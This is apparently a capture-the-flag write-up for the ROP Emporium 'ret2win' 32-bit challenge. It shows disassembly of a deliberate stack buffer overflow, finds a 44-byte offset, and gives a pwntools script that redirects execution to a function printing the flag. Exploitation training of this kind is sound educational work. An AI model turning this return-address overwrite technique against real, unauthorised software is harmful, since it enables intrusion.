ret2win
=

Locate a method that you want to call within the binary.
Call it by overwriting a saved return address on the stack.

Gathering Information
=

As the title of the challenge says, we have to perform a ret2win. We can start of things by seeing the file type and check the protections on the given binary:

```
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped
```

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols        No    0               3               ret2win32
```

As we can see, its a pretty basic challenge with only NX enabled which shouldn't bother us.

We can run the binary and see what it does:

```
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> aaa  
Thank you!

Exiting
```

Nothing special.

Reversing the Code
=

We can now start looking at the binary. Opening pwndgb on the binary, we can list the functions:

```sh
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt
0x080483f0  __libc_start_main@plt
0x08048400  setvbuf@plt
0x08048410  memset@plt
0x08048420  __gmon_start__@plt
0x08048430  _start
0x08048470  _dl_relocate_static_pie
0x08048480  __x86.get_pc_thunk.bx
0x08048490  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win
0x08048660  __libc_csu_init
0x080486c0  __libc_csu_fini
0x080486c4  _fini
```

Here, we can see there are 3 functions which stand out. Disassembling the main function, we only see it calling the pwnme function.
Disassembling the pwnme function, we can see this:

```sh
   0x080485ad <+0>:     push   ebp
   0x080485ae <+1>:     mov    ebp,esp
   0x080485b0 <+3>:     sub    esp,0x28
   0x080485b3 <+6>:     sub    esp,0x4
   0x080485b6 <+9>:     push   0x20
   0x080485b8 <+11>:    push   0x0
   0x080485ba <+13>:    lea    eax,[ebp-0x28]
   0x080485bd <+16>:    push   eax
   0x080485be <+17>:    call   0x8048410 <memset@plt>
   0x080485c3 <+22>:    add    esp,0x10
   0x080485c6 <+25>:    sub    esp,0xc
   0x080485c9 <+28>:    push   0x8048708
   0x080485ce <+33>:    call   0x80483d0 <puts@plt>
   0x080485d3 <+38>:    add    esp,0x10
   0x080485d6 <+41>:    sub    esp,0xc
   0x080485d9 <+44>:    push   0x8048768
   0x080485de <+49>:    call   0x80483d0 <puts@plt>
   0x080485e3 <+54>:    add    esp,0x10
   0x080485e6 <+57>:    sub    esp,0xc
   0x080485e9 <+60>:    push   0x8048788
   0x080485ee <+65>:    call   0x80483d0 <puts@plt>
   0x080485f3 <+70>:    add    esp,0x10
   0x080485f6 <+73>:    sub    esp,0xc
   0x080485f9 <+76>:    push   0x80487e8
   0x080485fe <+81>:    call   0x80483c0 <printf@plt>
   0x08048603 <+86>:    add    esp,0x10
   0x08048606 <+89>:    sub    esp,0x4
   0x08048609 <+92>:    push   0x38
   0x0804860b <+94>:    lea    eax,[ebp-0x28]
   0x0804860e <+97>:    push   eax
   0x0804860f <+98>:    push   0x0
   0x08048611 <+100>:   call   0x80483b0 <read@plt>
   0x08048616 <+105>:   add    esp,0x10
   0x08048619 <+108>:   sub    esp,0xc
   0x0804861c <+111>:   push   0x80487eb
   0x08048621 <+116>:   call   0x80483d0 <puts@plt>
   0x08048626 <+121>:   add    esp,0x10
   0x08048629 <+124>:   nop
   0x0804862a <+125>:   leave
   0x0804862b <+126>:   ret
```

We now have a buffer overflow scenario. Disassembling the ret2win function, we can see that the memory address `0x8048813` is calling `/bin/cat flag.txt` which is obviously where we want to return to after the overflow.
We wont directly return to `0x8048813` tho, we have to return to `0x0804862c` which is the address of the function.

```sh
   0x0804862c <+0>:     push   ebp
   0x0804862d <+1>:     mov    ebp,esp
   0x0804862f <+3>:     sub    esp,0x8
   0x08048632 <+6>:     sub    esp,0xc
   0x08048635 <+9>:     push   0x80487f6
   0x0804863a <+14>:    call   0x80483d0 <puts@plt>
   0x0804863f <+19>:    add    esp,0x10
   0x08048642 <+22>:    sub    esp,0xc
   0x08048645 <+25>:    push   0x8048813                        <----- /bin/cat flag.txt
   0x0804864a <+30>:    call   0x80483e0 <system@plt>
   0x0804864f <+35>:    add    esp,0x10
   0x08048652 <+38>:    nop
   0x08048653 <+39>:    leave
   0x08048654 <+40>:    ret
```

Lastly, we can confirm the offset by the inbuilt `cyclic` command which comes out to be `44`.

Now, we have all we need for our ret2win.

Exploiting the Binary
=

We can now build the script which does this stuff:

Buffer Overflow the input with 44 bytes.
Return to the ret2win function.

```py
from pwn import *

context.binary = elf = ELF("./ret2win32")

io = process()

offset = 44
ret2win_address = 0x0804862c

payload = b'A' * offset
payload += p32(ret2win_address)

io.recvline(">")
io.sendline(payload)

io.interactive()
io.close()
```

Running this gives us our flag!
